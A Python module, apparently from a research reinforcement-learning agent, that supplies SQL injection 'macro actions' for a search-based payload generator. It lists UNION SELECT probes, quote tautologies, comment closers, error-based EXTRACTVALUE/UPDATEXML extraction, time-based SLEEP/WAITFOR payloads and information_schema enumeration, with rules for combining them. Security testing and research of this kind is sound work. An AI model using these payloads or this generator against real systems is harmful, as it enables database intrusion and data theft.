"""
Macro Actions for SQL Injection RL Agent
Provides common SQL injection patterns as single actions to speed up MCTS search
"""

from typing import List, Dict, Any

class MacroAction:
    """Represents a macro action - a sequence of tokens that form a common SQL injection pattern."""
    
    def __init__(self, name: str, pattern: str, description: str, priority: int = 1):
        self.name = name
        self.pattern = pattern
        self.description = description
        self.priority = priority  # Higher priority = more likely to be selected

class MacroActionManager:
    """Manages macro actions for SQL injection patterns."""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.enabled = self.config.get('macro_actions', {}).get('enabled', True)
        self.macro_actions = []
        self._initialize_default_macros()
    
    def _initialize_default_macros(self):
        """Initialize default macro actions for common SQL injection patterns."""
        default_macros = [
            # Basic UNION SELECT patterns
            MacroAction("UNION_SELECT_1", "UNION SELECT 1", "Basic UNION with single column", 3),
            MacroAction("UNION_SELECT_2", "UNION SELECT 1,2", "UNION with two columns", 3),
            MacroAction("UNION_SELECT_3", "UNION SELECT 1,2,3", "UNION with three columns", 3),
            MacroAction("UNION_SELECT_4", "UNION SELECT 1,2,3,4", "UNION with four columns", 2),
            MacroAction("UNION_SELECT_5", "UNION SELECT 1,2,3,4,5", "UNION with five columns", 2),
            MacroAction("UNION_SELECT_6", "UNION SELECT 1,2,3,4,5,6", "UNION with six columns", 1),
            
            # UNION SELECT with NULL
            MacroAction("UNION_SELECT_NULL_1", "UNION SELECT NULL", "UNION with single NULL", 2),
            MacroAction("UNION_SELECT_NULL_2", "UNION SELECT NULL,NULL", "UNION with two NULLs", 2),
            MacroAction("UNION_SELECT_NULL_3", "UNION SELECT NULL,NULL,NULL", "UNION with three NULLs", 2),
            
            # Common injection starters
            MacroAction("OR_1_EQUALS_1", "OR 1=1", "Basic OR condition", 2),
            MacroAction("AND_1_EQUALS_1", "AND 1=1", "Basic AND condition", 2),
            MacroAction("QUOTE_OR_QUOTE", "' OR '1'='1", "Quote-based OR injection", 3),
            
            # Comment closures
            MacroAction("DOUBLE_DASH_COMMENT", "--", "SQL comment (double dash)", 3),
            MacroAction("HASH_COMMENT", "#", "MySQL comment (hash)", 2),
            MacroAction("BLOCK_COMMENT_START", "/*", "Block comment start", 1),
            MacroAction("BLOCK_COMMENT_END", "*/", "Block comment end", 1),
            
            # Information gathering
            MacroAction("VERSION_FUNCTION", "version()", "Database version function", 2),
            MacroAction("USER_FUNCTION", "user()", "Current user function", 2),
            MacroAction("DATABASE_FUNCTION", "database()", "Current database function", 2),
            
            # Error-based injection helpers
            MacroAction("EXTRACTVALUE_ERROR", "EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))", "ExtractValue error injection", 1),
            MacroAction("UPDATEXML_ERROR", "UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)", "UpdateXML error injection", 1),
            
            # Time-based injection
            MacroAction("SLEEP_5", "SLEEP(5)", "MySQL sleep function", 1),
            MacroAction("WAITFOR_DELAY", "WAITFOR DELAY '00:00:05'", "SQL Server delay", 1),
            
            # Common FROM clauses
            MacroAction("FROM_DUAL", "FROM DUAL", "Oracle DUAL table", 1),
            MacroAction("FROM_INFORMATION_SCHEMA", "FROM information_schema.tables", "Information schema tables", 2),
        ]
        
        # Filter macros based on configuration
        macro_set = self.config.get('macro_actions', {}).get('set', [])
        if macro_set:
            # Only include specified macros
            self.macro_actions = [m for m in default_macros if m.name in macro_set]
        else:
            # Include all default macros
            self.macro_actions = default_macros
    
    def get_applicable_macros(self, current_payload: str, context: Dict[str, Any] = None) -> List[MacroAction]:
        """Get macro actions that are applicable given the current payload and context."""
        if not self.enabled:
            return []
        
        applicable = []
        payload_upper = current_payload.upper()
        
        for macro in self.macro_actions:
            if self._is_macro_applicable(macro, payload_upper, context):
                applicable.append(macro)
        
        # Sort by priority (higher first)
        applicable.sort(key=lambda x: x.priority, reverse=True)
        return applicable
    
    def _is_macro_applicable(self, macro: MacroAction, payload_upper: str, context: Dict[str, Any] = None) -> bool:
        """Check if a macro action is applicable in the current context."""
        # Basic applicability rules
        
        # Don't repeat the same pattern
        if macro.pattern.upper() in payload_upper:
            return False
        
        # UNION SELECT macros are applicable if we don't already have UNION
        if macro.name.startswith("UNION_SELECT") and "UNION" not in payload_upper:
            return True
        
        # OR/AND conditions are applicable early in the payload
        if macro.name in ["OR_1_EQUALS_1", "AND_1_EQUALS_1", "QUOTE_OR_QUOTE"]:
            return len(payload_upper) < 50  # Only for short payloads
        
        # Comments are almost always applicable
        if "COMMENT" in macro.name and not any(c in payload_upper for c in ["--", "#", "/*"]):
            return True
        
        # Information gathering functions are applicable after SELECT
        if macro.name.endswith("_FUNCTION") and "SELECT" in payload_upper:
            return True
        
        # FROM clauses are applicable after SELECT but before existing FROM
        if macro.name.startswith("FROM_") and "SELECT" in payload_upper and "FROM" not in payload_upper:
            return True
        
        # Error-based injections are applicable in SELECT contexts
        if "ERROR" in macro.name and "SELECT" in payload_upper:
            return True
        
        # Time-based injections are applicable in various contexts
        if macro.name in ["SLEEP_5", "WAITFOR_DELAY"]:
            return True
        
        return False
    
    def get_macro_by_name(self, name: str) -> MacroAction:
        """Get a macro action by name."""
        for macro in self.macro_actions:
            if macro.name == name:
                return macro
        return None
    
    def get_all_macro_patterns(self) -> List[str]:
        """Get all macro patterns as a list of strings."""
        return [macro.pattern for macro in self.macro_actions]
    
    def is_enabled(self) -> bool:
        """Check if macro actions are enabled."""
        return self.enabled
